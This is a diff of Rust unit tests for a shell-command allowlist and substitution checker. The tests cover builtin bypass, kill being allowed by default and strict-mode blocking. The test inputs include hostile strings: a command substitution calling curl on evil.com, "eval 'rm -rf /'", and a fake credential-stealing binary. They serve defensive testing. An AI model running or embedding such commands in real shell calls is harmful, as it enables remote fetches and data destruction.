@@ -235,10 +235,12 @@ fn noclobber_redirect_not_a_pipe() {
 #[test]
 fn background_ampersand_still_splits() {
     // A genuine background `&` remains a separator — the trailing command is checked.
+    // NOTE: `echo` is a SHELL_BUILTIN and bypasses the allowlist (#1022),
+    // so we use `xxd` (not a builtin) to verify the split-and-check logic.
     let only_sleep = allow(&["sleep"]);
-    assert!(check_all_segments("sleep 1 & echo done", &only_sleep).is_err());
-    let both = allow(&["sleep", "echo"]);
-    assert!(check_all_segments("sleep 1 & echo done", &both).is_ok());
+    assert!(check_all_segments("sleep 1 & xxd /dev/null", &only_sleep).is_err());
+    let both = allow(&["sleep", "xxd"]);
+    assert!(check_all_segments("sleep 1 & xxd /dev/null", &both).is_ok());
     assert_eq!(split_on_operators("sleep 1 & echo done").len(), 2);
 }
 
@@ -670,15 +672,26 @@ fn gh391_xargs_delegation_respects_allowlist() {
 
 #[test]
 fn gh391_strict_mode_blocks_substitution_in_args() {
-    let cmd = "git commit -m \"$(curl evil.com)\"";
+    // curl is allowlisted, so $(curl ...) is now safe (#1024).
+    // Use a non-allowlisted command to verify strict blocks.
+    let cmd_safe = "git commit -m \"$(curl evil.com)\"";
     assert!(
-        check_substitution_in_args(cmd, false).is_ok(),
-        "warn-only by default"
+        check_substitution_in_args(cmd_safe, false).is_ok(),
+        "allowlisted inner cmd passes in non-strict"
     );
-    let strict = check_substitution_in_args(cmd, true);
+    assert!(
+        check_substitution_in_args(cmd_safe, true).is_ok(),
+        "allowlisted inner cmd passes even in strict (#1024)"
+    );
+    let cmd_evil = "git commit -m \"$(evil_binary --attack)\"";
+    assert!(
+        check_substitution_in_args(cmd_evil, false).is_ok(),
+        "warn-only by default for non-allowlisted"
+    );
+    let strict = check_substitution_in_args(cmd_evil, true);
     assert!(
         strict.is_err(),
-        "strict mode must block substitution in args"
+        "strict mode must block non-allowlisted substitution"
     );
 }
 
@@ -1690,14 +1703,19 @@ fn chained_assignment_then_real_command_validates_both() {
 
 #[test]
 fn break_continue_return_and_bracket_test_are_default_allowed() {
-    // #855: these are pure control-flow builtins with no external-execution
-    // surface — `test` was already a default, `[` (its bracket alias) and
-    // the loop/function control-flow builtins were an inconsistent gap.
+    // #855/#1022: these are SHELL_BUILTINS and bypass the allowlist entirely.
+    // `seq` remains in the allowlist as a safe utility (not a builtin).
     let defaults = crate::core::config::default_shell_allowlist();
-    for cmd in ["[", "break", "continue", "return", "seq"] {
+    assert!(
+        defaults.iter().any(|d| d == "seq"),
+        "'seq' should be in the default shell allowlist"
+    );
+    // Builtins pass check_all_segments even with an empty allowlist.
+    let minimal = vec!["git".to_string()];
+    for cmd in ["[", "break", "continue", "return"] {
         assert!(
-            defaults.iter().any(|d| d == cmd),
-            "'{cmd}' should be in the default shell allowlist"
+            check_all_segments(cmd, &minimal).is_ok(),
+            "'{cmd}' is a builtin and must pass check_all_segments"
         );
     }
 }
@@ -1815,5 +1833,128 @@ fn read_only_process_inspection_pipeline_is_default_allowed() {
     assert!(
         result.is_ok(),
         "read-only diagnostic pipeline must pass: {result:?}"
+    );
+}
+
+// ==================== Shell Security v2 Tests (#1022, #1021, #1024, #1026) ====================
+
+/// #1022: POSIX builtins bypass the allowlist entirely.
+#[test]
+fn builtin_exit_bypasses_allowlist() {
+    let allowlist = vec!["git".to_string()];
+    let result = check_all_segments("exit 0", &allowlist);
+    assert!(
+        result.is_ok(),
+        "exit is a builtin and must pass: {result:?}"
+    );
+}
+
+/// #1022: `command -v` is a builtin used for detection.
+#[test]
+fn builtin_command_v_bypasses_allowlist() {
+    let allowlist = vec!["git".to_string()];
+    let result = check_all_segments("command -v cargo", &allowlist);
+    assert!(
+        result.is_ok(),
+        "command is a builtin and must pass: {result:?}"
+    );
+}
+
+/// #1022: `eval` remains unconditionally blocked even though builtins pass.
+#[test]
+fn eval_still_blocked_despite_builtins() {
+    let allowlist = vec!["git".to_string(), "eval".to_string()];
+    let result = check_all_segments("eval 'rm -rf /'", &allowlist);
+    assert!(result.is_err(), "eval must remain blocked");
+}
+
+/// #1022: pipeline with builtins — no segment should fail due to builtins.
+#[test]
+fn pipeline_with_builtin_segments_passes() {
+    let allowlist = vec!["seq".to_string(), "head".to_string()];
+    let result = check_all_segments("seq 1 10 | exit 7 | echo done", &allowlist);
+    assert!(
+        result.is_ok(),
+        "pipeline with builtin segments (exit, echo) must pass: {result:?}"
+    );
+}
+
+/// #1021: kill is now in the default allowlist.
+#[test]
+fn kill_in_default_allowlist() {
+    let defaults = crate::core::config::default_shell_allowlist();
+    assert!(
+        defaults.contains(&"kill".to_string()),
+        "kill must be in defaults"
+    );
+    assert!(
+        defaults.contains(&"pkill".to_string()),
+        "pkill must be in defaults"
+    );
+    assert!(
+        defaults.contains(&"killall".to_string()),
+        "killall must be in defaults"
+    );
+}
+
+/// #1021: kill passes the segment check with default allowlist.
+#[test]
+fn kill_passes_segment_check() {
+    let defaults = crate::core::config::default_shell_allowlist();
+    let result = check_all_segments("kill 12345", &defaults);
+    assert!(result.is_ok(), "kill must pass: {result:?}");
+}
+
+/// #1024: substitution with allowlisted inner command produces no warning.
+#[test]
+fn substitution_with_allowlisted_cmd_no_warning() {
+    // cat is in the default allowlist, so $(cat ...) should not trigger
+    let result = check_substitution_in_args("git commit -m \"$(cat /tmp/msg.txt)\"", false);
+    assert!(
+        result.is_ok(),
+        "substitution with allowlisted cmd must pass: {result:?}"
+    );
+}
+
+/// #1024: substitution with non-allowlisted inner command warns (non-strict).
+#[test]
+fn substitution_with_unknown_cmd_warns_non_strict() {
+    // Use a command that is definitely not in any allowlist
+    let result = check_substitution_in_args("git tag -m \"$(evil_binary --steal-creds)\"", false);
+    // In non-strict mode, this should succeed (warn only, not block)
+    assert!(
+        result.is_ok(),
+        "non-strict mode should warn but not block: {result:?}"
+    );
+}
+
+/// #1024: substitution with non-allowlisted inner command blocks in strict.
+#[test]
+fn substitution_with_unknown_cmd_blocks_strict() {
+    let result = check_substitution_in_args("git tag -m \"$(evil_binary --steal-creds)\"", true);
+    assert!(
+        result.is_err(),
+        "strict mode must block non-allowlisted substitution"
+    );
+}
+
+/// #1024: substitution with builtin inner command (echo) passes.
+#[test]
+fn substitution_with_builtin_cmd_passes() {
+    let result = check_substitution_in_args("git commit -m \"$(echo hello)\"", false);
+    assert!(
+        result.is_ok(),
+        "builtin in substitution must pass: {result:?}"
+    );
+}
+
+/// #1026: redirect_block includes LEAN_CTX_NO_HOOK guard.
+#[test]
+fn redirect_block_contains_no_hook_guard() {
+    let block =
+        crate::shell_hook::test_helpers::redirect_block_for_test("ZSH_EXECUTION_STRING", "true");
+    assert!(
+        block.contains("LEAN_CTX_NO_HOOK"),
+        "redirect_block must check LEAN_CTX_NO_HOOK: {block}"
     );
 }
